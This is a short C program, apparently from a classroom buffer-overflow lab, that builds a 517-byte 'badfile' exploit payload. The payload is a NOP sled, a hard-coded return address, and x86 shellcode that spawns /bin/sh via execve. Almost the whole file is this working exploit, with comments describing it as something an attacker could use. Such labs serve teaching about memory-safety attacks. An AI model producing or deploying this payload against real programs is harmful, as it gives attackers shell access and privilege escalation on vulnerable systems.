// Constructs a buffer that contains a payload for a buffer overflow attack
// Initializes the buffer with NOP instructions, sets the return address to
// point to the NOP sled, and injects shellcode

// Purpose of this code is to create a "badfile" that an attacker could exploit

#include <stdlib.h>
#include <stdio.h>

const char code[] = 
	"\x31\xc0"		/* xorl		%eax,%eax 	*/
	"\x50"			/* pushl	%eax 		*/
	"\x68""//sh"	/* pushl	$0x68732f2f */
	"\x68""/bin"	/* pushl	$0x6e69622f */
	"\x89\xe3"		/* movl		%esp,%ebx 	*/
	"\x50"			/* pushl	%eax		*/	
	"\x53"			/* pushl	%ebx		*/
	"\x89\xe1"		/* movl		%esp,%ecx	*/
	"\x99"			/* cdq					*/
	"\xb0\x0b"		/* movb		$0x0b,%al	*/
	"\xcd\x80"		/* int		$0x80		*/
;

int main(int argc, char **argv)
{
	char buffer[517];
    FILE *badfile;

    // initialize buffer with 0x90 (NOP instruction)
    memset(&buffer,0x90,517); 
    
    // Here we need to place the appropriate return address
    *((long *) (buffer + 0x24)) = 0xbffff1d0; // 0xbffff1d0 (distance: B8)
    
    // Place the shellcode (code array) towards the end of the 'buffer'
	memcpy(buffer+sizeof(buffer)-sizeof(code),code,sizeof(code));
    
    // Save the contents to the badfile
    badfile=fopen("./badfile","w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);
}